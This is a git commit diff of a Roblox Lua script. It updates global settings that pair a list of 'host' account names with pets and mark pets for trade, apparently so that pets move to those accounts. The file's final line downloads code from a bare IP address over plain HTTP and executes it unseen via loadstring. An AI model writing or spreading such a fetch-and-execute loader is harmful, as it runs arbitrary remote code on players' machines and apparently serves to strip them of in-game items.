b036c17f7b145ebc1a294615ce8571c7431e422a
phantomz888 <chunnyzxd001@gmail.com>
2025-08-03 06:55:32 +0700

    Update t.lua

--- t.lua
+++ t.lua
@@ -3,45 +3,18 @@ repeat wait() until game:GetService("Players")
 repeat wait() until game:GetService("Players").LocalPlayer
 repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui
 
+_G.UserKey = "1"
+
 _G.HostName = {
-    ["Kluthbroce98130"] = "Kitsune",
-    ["Youkdoto126"] = "Corrupted Kitsune",
-    ["Asanipisor44266"] = "Dragonfly",
-    ["Bibocozy6597"] = "Mimic Octopus",
-    ["Huskikyson01979"] = "Corrupted Kodama",
-    ["Hildewalti15625"] = "Kitsune",
-    ["Seyararado28931"] = "Corrupted Kitsune",
-    ["Pentgick5476"] = "Dragonfly",
-    ["Elhajkord09116"] = "Mimic Octopus",
-    ["Isofttecce476"] = "Corrupted Kodama",
-    ["Onakbhide668"] = "Kitsune",
-    ["Ranftsarju1275"] = "Corrupted Kitsune",
-    ["Batpanny7841"] = "Dragonfly",
-    ["Shiauclari2516"] = "Mimic Octopus",
-    ["Tyceravi793"] = "Corrupted Kodama",
-    ["Huyomo884"] = "Kitsune",
-    ["Wickjusay8514"] = "Corrupted Kitsune",
-    ["Jhonskasap61064"] = "Dragonfly",
-    ["Ervensward3413"] = "Mimic Octopus",
-    ["Reemaockey3182"] = "Corrupted Kodama",
-    ["Halanjuge4314"] = "Kitsune",
-    ["Zembalabbe16619"] = "Corrupted Kitsune",
-    ["Asnatchira48211"] = "Dragonfly",
-    ["Pionjahan3363"] = "Mimic Octopus",
-    ["Hootsrieu51125"] = "Corrupted Kodama",
-    ["Supakfeliu76417"] = "Kitsune",
-    ["Posssaah04868"] = "Corrupted Kitsune",
-    ["Emerlanz31472"] = "Dragonfly",
-    ["Smockhoy28125"] = "Mimic Octopus",
-    ["Aggietromp90849"] = "Corrupted Kodama",
+    ["BaruOd74942"] = "Mochi Mouse",
+    ["EltoAr35246"] = "Corrupted Kitsune",
+    ["SairMeLi7406"] = "Corrupted Kitsune",
+    ["VarnBu6588"] = "Corrupted Kitsune",
 }
 
 _G.SelectPetForTrade = {
-    "Kitsune",
     "Corrupted Kitsune",
-    "Dragonfly",
-    "Mimic Octopus",
-    "Corrupted Kodama",
+    "Mochi Mouse",
 }
 
 loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()
